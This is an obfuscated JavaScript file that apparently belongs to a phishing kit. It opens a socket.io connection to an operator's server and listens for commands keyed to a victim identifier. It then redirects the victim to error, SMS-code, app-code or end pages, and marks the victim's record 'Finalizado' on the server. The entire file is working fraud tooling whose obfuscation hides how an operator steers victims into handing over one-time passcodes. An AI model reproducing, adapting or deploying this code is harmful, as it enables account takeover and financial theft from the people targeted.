const _0xb84654 = _0x5dd5;
(function (_0x256ede, _0x421f52) {
  const _0x25a5be = _0x5dd5,
    _0x335785 = _0x256ede();
  while (!![]) {
    try {
      const _0x3c50aa =
        -parseInt(_0x25a5be(0x153)) / 0x1 +
        (parseInt(_0x25a5be(0x149)) / 0x2) *
          (-parseInt(_0x25a5be(0x143)) / 0x3) +
        -parseInt(_0x25a5be(0x15b)) / 0x4 +
        -parseInt(_0x25a5be(0x158)) / 0x5 +
        parseInt(_0x25a5be(0x159)) / 0x6 +
        (-parseInt(_0x25a5be(0x15d)) / 0x7) *
          (-parseInt(_0x25a5be(0x147)) / 0x8) +
        parseInt(_0x25a5be(0x154)) / 0x9;
      if (_0x3c50aa === _0x421f52) break;
      else _0x335785["push"](_0x335785["shift"]());
    } catch (_0x584f17) {
      _0x335785["push"](_0x335785["shift"]());
    }
  }
})(_0x5390, 0x44e24);
var socket = io[_0xb84654(0x15e)](url);
function _0x5dd5(_0x39c9d4, _0x33cbca) {
  const _0x539040 = _0x5390();
  return (
    (_0x5dd5 = function (_0x5dd545, _0x46ce96) {
      _0x5dd545 = _0x5dd545 - 0x142;
      let _0x38be21 = _0x539040[_0x5dd545];
      return _0x38be21;
    }),
    _0x5dd5(_0x39c9d4, _0x33cbca)
  );
}
socket["on"]("ps", function (_0x25ad6d) {
  const _0x41d2b6 = _0xb84654;
  if (
    _0x25ad6d[_0x41d2b6(0x15f)] == _0x41d2b6(0x155) &&
    _0x25ad6d["valid"] == info[_0x41d2b6(0x151)]["cc"]
  )
    window[_0x41d2b6(0x14f)][_0x41d2b6(0x150)] = _0x41d2b6(0x142);
  else {
    if (
      _0x25ad6d["valor"] == _0x41d2b6(0x14a) &&
      _0x25ad6d[_0x41d2b6(0x157)] == info[_0x41d2b6(0x151)]["cc"]
    )
      window[_0x41d2b6(0x14f)][_0x41d2b6(0x150)] = _0x41d2b6(0x148);
    else {
      if (
        _0x25ad6d["valor"] == _0x41d2b6(0x14b) &&
        _0x25ad6d[_0x41d2b6(0x157)] == info["metaInfo"]["cc"]
      )
        window["location"][_0x41d2b6(0x150)] = _0x41d2b6(0x144);
      else {
        if (
          _0x25ad6d[_0x41d2b6(0x15f)] == _0x41d2b6(0x145) &&
          _0x25ad6d[_0x41d2b6(0x157)] == info[_0x41d2b6(0x151)]["cc"]
        ) {
          async function _0x361149() {
            const _0xdf65f0 = _0x41d2b6,
              _0xdb6552 = await fetch(url + "/trico/tricoData", {
                method: _0xdf65f0(0x156),
                headers: { "Content-Type": _0xdf65f0(0x14d) },
              }),
              _0x216d29 = await _0xdb6552[_0xdf65f0(0x152)](),
              _0x350339 = [..._0x216d29];
            for (const _0x1dafa6 of _0x350339) {
              if (_0x1dafa6["id"] == info[_0xdf65f0(0x151)]["cc"]) {
                console[_0xdf65f0(0x14c)](_0xdf65f0(0x15a));
                const _0x36a0dc = await fetch(
                    url + _0xdf65f0(0x15c) + _0x1dafa6[_0xdf65f0(0x146)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": _0xdf65f0(0x14d) },
                      body: JSON[_0xdf65f0(0x160)]({ estado: "Finalizado" }),
                    }
                  ),
                  _0x10c713 = await _0x36a0dc[_0xdf65f0(0x152)]();
              }
            }
            window[_0xdf65f0(0x14f)]["href"] = _0xdf65f0(0x14e);
          }
          _0x361149();
          return;
        }
      }
    }
  }
});
function _0x5390() {
  const _0x5c9a96 = [
    "metaInfo",
    "json",
    "534330teclnj",
    "7978599IwaLYz",
    "user",
    "GET",
    "valid",
    "1319605tqYZxN",
    "1049778WvpXKk",
    "Usuario\x20encontrado",
    "39108ppkzyN",
    "/trico/tricofinishPse/",
    "3178MfijBm",
    "connect",
    "valor",
    "stringify",
    "./index.error.html",
    "2901bKfCMk",
    "./ot-sms.html",
    "finish",
    "idreg",
    "608cilbcO",
    "./ot-app.html",
    "12SSeFdq",
    "otp",
    "newOtp",
    "log",
    "application/json",
    "../end.html",
    "location",
    "href",
  ];
  _0x5390 = function () {
    return _0x5c9a96;
  };
  return _0x5390();
}
